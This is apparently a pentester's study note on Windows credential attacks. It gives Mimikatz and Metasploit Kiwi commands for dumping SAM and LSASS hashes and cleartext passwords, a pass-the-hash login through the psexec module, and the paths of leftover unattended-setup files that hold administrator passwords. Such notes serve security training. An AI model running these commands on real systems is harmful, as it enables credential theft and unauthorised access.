# Windows account hashes

Several types of hashes have been used on Windows. LM and NTLM hashes. LM hashes have been deprecated since Windows Server 2003.

User account passwords are stored in the SAM (Security Account Manager) database. It is locked when the OS is running, and encrypted in more recent versions of Windows.

### Dumping hashes with [[Mimikatz]]

Mimikatz requires elevated privileges to run correctly

With the executable :
+ `privilege::debug`
+ `lsadump::sam`
	+ Dumps the hashes
+ `sekurlsa::logonpasswords`
	+ Can display cleartext passwords if stored in memory. This depends on the system configuration.

With the Kiwi extension for [[Metasploit]] :
+ Migrating to a 64 bit meterpreter to avoid issues on a x64 system :
	+ `pgrep lsass`
	+ `migrate LSASS_PID`
+ `load kiwi`
+ `creds_all`
	+ Dumps the hashes  in memory and clear passwords if possible
+ `lsa_dump_sam`
	+ Dumps the hashes and the SysKey

### Pass-The-Hash
Using these attacks and the obtained hashes, we can legitimately login on a system, without exploiting any service.
It requires the NTLM and LM hashes. The LM hashes can be obtained with the `hashdump` command on kiwi.

+ Using [[Metasploit]] with SMB enabled:
	+ `windows/smb/psexec`
	+ the SMBuser can be set to the user we want to connect as
	+ the SMBPass can be set to `LM_hash:NTLM_hash`

# Unattended Windows Setup

This is a tool that allows to mass install Windows on computers. It uses configuration files containing at least the Administrator account password. If these files are left after installation, they can give us legitimate credentials.

The files are typically :
+ `C:\Windows\Panther\Unattend.xml`
+ `C:\Windows\Panther\Autounattend.xml`

The passwords may be encoded in base64

Searching with [[Metasploit]] :
+ `search -f Unattend.xml` with a Meterpreter shell